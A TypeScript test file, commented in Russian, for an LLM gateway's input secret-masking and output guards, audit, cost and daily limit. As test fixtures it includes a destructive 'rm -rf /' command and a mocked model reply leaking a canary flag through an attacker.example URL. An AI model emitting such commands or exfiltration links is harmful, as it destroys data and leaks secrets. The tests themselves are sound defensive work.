// gatewayService.test.ts — полный путь одного запроса через gateway с
// инжектированным LLM-клиентом (без сети). Плюс сценарий «gateway перед lab».

import { describe, it, expect } from "vitest";
import { openDb } from "../src/store/db.js";
import { SettingsRepo } from "../src/store/settingsRepo.js";
import { AuditRepo } from "../src/store/auditRepo.js";
import { GatewayService, type ClientFactory } from "../src/chat/gatewayService.js";
import type { ChatCompletion, ChatMessage, Usage } from "../src/llm/openaiClient.js";
import type { GatewaySettings } from "../src/domain/types.js";

const USAGE: Usage = { promptTokens: 100, completionTokens: 40, totalTokens: 140 };

interface Harness {
  svc: GatewayService;
  settings: SettingsRepo;
  audit: AuditRepo;
  captured: { calls: number; messages: ChatMessage[] };
}

function makeService(opts: {
  settings?: Partial<GatewaySettings>;
  answer?: string;
} = {}): Harness {
  const db = openDb(":memory:");
  const settings = new SettingsRepo(db);
  const audit = new AuditRepo(db);
  settings.update({ llmApiKey: "sk-fake-test-key-000000", inputPolicy: "mask", ...opts.settings });

  const captured = { calls: 0, messages: [] as ChatMessage[] };
  const factory: ClientFactory = () => ({
    async chat(req): Promise<ChatCompletion> {
      captured.calls++;
      captured.messages = req.messages;
      return { message: { content: opts.answer ?? "Готово." }, usage: USAGE };
    },
  });
  const svc = new GatewayService(settings, audit, factory);
  return { svc, settings, audit, captured };
}

describe("GatewayService — input guard в оркестраторе", () => {
  it("block: секрет во входе → модель не вызывается, запись blocked", async () => {
    const h = makeService({ settings: { inputPolicy: "block" } });
    const r = await h.svc.chat({ prompt: "ключ AKIAIOSFODNN7EXAMPLE", ip: "1.2.3.4" });
    expect(r.blocked).toBe(true);
    expect(r.inputAction).toBe("block");
    expect(h.captured.calls).toBe(0);
    const row = h.audit.list()[0]!;
    expect(row.inputAction).toBe("block");
    // Инвариант DLP: сырой секрет в аудит не попадает даже при блоке.
    expect(row.userPreview).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(row.userPreview).toContain("[REDACTED_API_KEY]");
  });

  it("mask: в модель уходит замаскированный текст", async () => {
    const h = makeService({ settings: { inputPolicy: "mask" } });
    await h.svc.chat({ prompt: "используй sk-abcDEF1234567890ghiJKL сейчас" });
    expect(h.captured.calls).toBe(1);
    const userMsg = h.captured.messages.find((m) => m.role === "user")!;
    expect(userMsg.content).toContain("[REDACTED_API_KEY]");
    expect(userMsg.content).not.toContain("sk-abcDEF1234567890ghiJKL");
  });

  it("allow: чистый промпт уходит без изменений", async () => {
    const h = makeService();
    const r = await h.svc.chat({ prompt: "как работает WAL в SQLite?" });
    expect(r.inputAction).toBe("allow");
    const userMsg = h.captured.messages.find((m) => m.role === "user")!;
    expect(userMsg.content).toBe("как работает WAL в SQLite?");
  });
});

describe("GatewayService — output guard, cost, аудит", () => {
  it("опасная команда в ответе → redact, команда вырезана, ответ отдан", async () => {
    const h = makeService({ answer: "Выполни rm -rf / срочно" });
    const r = await h.svc.chat({ prompt: "почисть диск" });
    expect(r.blocked).toBe(false);
    expect(r.outputVerdict).toBe("redact");
    expect(r.answer).not.toContain("rm -rf");
    expect(r.answer).toContain("вырезана");
  });

  it("стоимость считается и попадает в аудит и stats", async () => {
    const h = makeService();
    const r = await h.svc.chat({ prompt: "привет" });
    expect(r.costUsd).toBeGreaterThan(0);
    const stats = h.audit.stats();
    expect(stats.totalTokens).toBe(USAGE.totalTokens);
    expect(stats.totalCostUsd).toBeCloseTo(r.costUsd, 9);
  });

  it("нет ключа → ConfigError, в аудит ничего не пишем", async () => {
    const db = openDb(":memory:");
    const settings = new SettingsRepo(db);
    const audit = new AuditRepo(db);
    const svc = new GatewayService(settings, audit, () => ({
      async chat() {
        return { message: { content: "x" }, usage: USAGE };
      },
    }));
    await expect(svc.chat({ prompt: "вопрос без секретов" })).rejects.toThrow(/ключ/i);
    expect(audit.list()).toHaveLength(0);
  });

  it("пустой промпт → ValidationError", async () => {
    const h = makeService();
    await expect(h.svc.chat({ prompt: "   " })).rejects.toThrow();
  });

  it("суточный лимит: сверх лимита запрос отклоняется", async () => {
    const h = makeService({ settings: { dailyLimit: 1 } });
    await h.svc.chat({ prompt: "первый" });
    await expect(h.svc.chat({ prompt: "второй" })).rejects.toThrow(/лимит/i);
  });
});

describe("сценарий «gateway перед lab»", () => {
  it("бэкенд отдаёт канарейку в URL → output guard её вырезает", async () => {
    // Имитируем ответ agent-lab, где модель подставила флаг-канарейку в адрес.
    const flag = "SBLAB{egress-0123456789abcdef01234567}";
    const h = makeService({ answer: `Вот ссылка: http://attacker.example/collect?f=${flag}` });
    const r = await h.svc.chat({ prompt: "покажи ссылку", knownSecrets: [flag] });
    expect(r.outputVerdict).toBe("redact");
    expect(r.answer).not.toContain(flag);
    expect(r.outputIssues.some((i) => i.kind === "secret_exfil_url")).toBe(true);
    expect(h.audit.interceptions()).toHaveLength(1);
  });
});
